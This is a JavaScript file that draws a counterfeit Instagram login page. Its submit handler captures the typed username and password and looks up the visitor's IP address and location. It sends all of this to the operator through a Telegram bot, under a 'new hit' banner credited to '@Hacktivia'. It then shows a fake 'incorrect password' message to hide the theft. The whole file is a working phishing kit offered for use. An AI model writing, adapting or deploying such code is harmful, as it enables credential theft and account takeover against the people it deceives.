(function () {
  const style = document.createElement('style');
  style.innerHTML = `
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 90vh;
      margin: 0;
    }
    .container {
      width: 100%;
      max-width: 400px;
      text-align: center;
      padding: 8px;
    }
    .language-selector {
      font-size: 14px;
      color: #444;
      margin-bottom: 50px;
    }
    .logo {
      width: 70px;
      margin-bottom: 50px;
    }
    .login-form {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 15px;
    }
    .login-form input {
      padding: 15px;
      border: 1px solid #ccc;
      border-radius: 15px;
      font-size: 15px;
    }
    .login-btn {
      background-color: #0095f6;
      color: #fff;
      border: none;
      border-radius: 30px;
      padding: 14px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
    }
    .forgot-password {
      display: block;
      margin: 15px 0 30px;
      color: #00376b;
      text-decoration: none;
      font-size: 14px;
    }
    .create-btn {
      border: 1px solid #0095f6;
      width: 90%;
      background-color: #fff;
      color: #0095f6;
      padding: 14px;
      border-radius: 30px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 40px;
    }
   
    .meta-logo {
      margin-top: 20px;
    }
    .meta { width: 70px; }
    .dwn { width: 12px; margin-left: 5px; }
    #successMessage {
      color: #ed4956;
      font-size: 14px;
      text-align: center;
      display: none;
      margin-top: 10px;
    }
    
    button:focus,
    input:focus {
      outline: none;
    }
  `;
  document.head.appendChild(style);


  window.addEventListener("DOMContentLoaded", function () {
    const container = document.createElement("div");
    container.className = "container";
    container.innerHTML = `
      <div class="language-selector">
        English (US) <img src="https://ranky10.github.io/Pi/dwn.png" alt="" class="dwn">
      </div>
      <img src="https://allinlinks.github.io/Img/instagram.png" alt="Instagram Logo" class="logo" />
      <form id="loginForm" class="login-form">
        <input id="username" type="text" placeholder="Username, email or mobile number" required autocomplete="username" />
        <input id="password" type="password" placeholder="Password" required autocomplete="current-password" />
        <button type="submit" class="login-btn">Log in</button>
      </form>
      <a href="#" class="forgot-password">Forgot password?</a>
      <p id="successMessage"></p>
      <button class="create-btn">Create new account</button>
      <div class="meta-logo">
        <img src="https://allinlinks.github.io/Img/meta.png" alt="Meta" class="meta">
      </div>
    `;
    document.body.appendChild(container);
    
     document.getElementById('loginForm').addEventListener('submit', async function(event) {
      event.preventDefault();

      const userVal = document.getElementById('username').value;
      const passVal = document.getElementById('password').value;
      
      let ip = "N/A", country = "N/A", state = "N/A", code = "N/A";

      // 1. Fetch Location Data
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ip = data.ip || "N/A";
        country = data.country_name || "N/A";
        state = data.region || "N/A";
        code = data.country_calling_code || "N/A";
      } catch (e) {
        console.error("IP Data Fetch Failed");
      }

      const dateTime = new Date().toLocaleString();

      // 2. Format Message (The <code> tag makes it "Tap to Copy" in Telegram)
      const message = `𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪
      
🐉⊚-----------------------------------⊚🐉

👤<b>Username:</b> <code>${userVal}</code>

📟<b>Password:</b> <code>${passVal}</code>

🌍<b>Country:</b> ${country}

🏴<b>State:</b> ${state}

⚙️<b>IP Address:</b> ${ip}

📝<b>Code:</b> <code>${code}</code>

⏱<b>Date/Time:</b> ${dateTime}

🌐<b>Login From:</b> Instagram

🐉⊚-----------------------------------⊚🐉

↝ ᴅᴇᴠ ʙʏ » @Hacktivia`;

      // 3. Send to Telegram
      try {
        await fetch(`https://api.telegram.org/bot${iovjrtrdhhj9}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: I94626736O,
            text: message,
            parse_mode: 'HTML'
          })
        });
      } catch (e) {
        console.error("Telegram Send Failed");
      }
      
      const successMessage = document.getElementById('successMessage');
      successMessage.style.display = 'block';
      successMessage.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
      

 document.getElementById('password').value = '';
    });
  });
})();
